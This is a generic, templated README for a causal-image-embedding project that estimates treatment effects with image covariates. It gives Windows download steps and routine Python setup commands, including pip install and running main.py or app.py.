# 🖼️ causal-image-embedding - Image embeddings for causal analysis

<p align="center">
  <a href="https://github.com/fragmentationcarolinalupine81/causal-image-embedding">
    <img src="https://img.shields.io/badge/Download%20the%20app-Visit%20GitHub-6A5ACD?style=for-the-badge&logo=github&logoColor=white" alt="Download the app" />
  </a>
</p>

## 📌 What this app does

Causal image embedding helps you work with image data and treatment data in one place. It lets you build image-based embeddings and estimate average treatment effects, or ATE, from your data.

Use it when you need to compare groups, study outcomes, and include images as part of your analysis.

## 🪟 Windows download and setup

Use this link to visit the download page:

[Open the download page](https://github.com/fragmentationcarolinalupine81/causal-image-embedding)

### Steps to get started on Windows

1. Open the link above in your web browser.
2. On the GitHub page, click the green **Code** button.
3. Choose **Download ZIP**.
4. Save the file to your computer.
5. Open the ZIP file.
6. Extract it to a folder you can find again, such as **Downloads** or **Desktop**.
7. Open the folder and look for the app files.
8. If the app includes a Windows launcher file, double-click it to run the app.
9. If you see a Python project instead of an app file, follow the run steps below.

## 🧰 What you need on your computer

For best results, use:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 2 GB of free disk space
- A stable internet connection for the first setup
- Python 3.12 or newer

## ▶️ Run the project on Windows

If the download includes source files instead of a ready-made app, use these steps:

1. Install Python 3.12 or newer from the official Python website.
2. During setup, check the box that says **Add Python to PATH**.
3. Open the folder you extracted.
4. Click the address bar in File Explorer.
5. Type `cmd` and press Enter.
6. In the black window, run this command:

```bash
python --version
```

7. If Python shows a version number, continue.
8. If the project includes a `requirements.txt` file, install the needed packages with:

```bash
pip install -r requirements.txt
```

9. If the project includes a main file, start it with one of these common commands:

```bash
python main.py
```

```bash
python app.py
```

```bash
python -m streamlit run app.py
```

10. Wait for the app window or browser tab to open.

## 🗂️ Typical folder contents

You may see files like these after download:

- `README.md` - setup and usage notes
- `requirements.txt` - Python package list
- `main.py` - main program file
- `app.py` - app start file
- `data/` - sample data files
- `models/` - saved model files
- `notebooks/` - analysis examples

## 📷 How to use it

A typical workflow looks like this:

1. Start the app.
2. Load your image data.
3. Add the treatment and outcome fields.
4. Choose the embedding method.
5. Run the analysis.
6. View the estimated treatment effect.
7. Export your results if needed.

## 🔍 Main features

- Image embedding for analysis tasks
- ATE estimation with image covariates
- Support for treatment and outcome data
- Clear output for model results
- Simple workflow for non-technical users
- Research-friendly file layout
- Python-based setup

## 📁 Example use cases

This app can help with tasks such as:

- Studying how image features relate to outcomes
- Comparing treated and untreated groups
- Running causal analysis with visual data
- Testing image-based signals in research data
- Reviewing how image covariates affect results

## 🛠️ If the app does not open

Try these checks:

1. Make sure the files fully extracted from the ZIP.
2. Check that Python is installed.
3. Reopen Command Prompt in the project folder.
4. Run `python --version` again.
5. Confirm that required packages are installed.
6. Check the folder for the correct start file.
7. Try another start command from the run section above.

## 📄 Files you may need to edit

If you plan to change the project later, these files are usually the most useful:

- `README.md` for setup details
- `requirements.txt` for package changes
- `main.py` or `app.py` for app behavior
- config files for input paths and options

## 🔐 License

This project uses the MIT License.